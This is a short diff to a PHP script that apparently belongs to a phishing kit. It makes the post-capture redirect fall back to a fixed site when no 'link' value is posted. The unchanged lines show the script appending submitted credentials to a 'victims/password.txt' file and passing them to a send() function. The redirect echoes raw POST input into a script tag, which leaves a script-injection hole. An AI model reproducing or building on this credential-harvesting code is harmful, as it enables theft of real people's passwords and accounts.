@@ -11,5 +11,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST')
     File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                      
     send($data);	
 }
-echo "<script>window.location.replace('".$_POST['link']."');</script>";
+if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
+else echo "<script>window.location.replace('https://graysuit.github.io');</script>";
 ?>
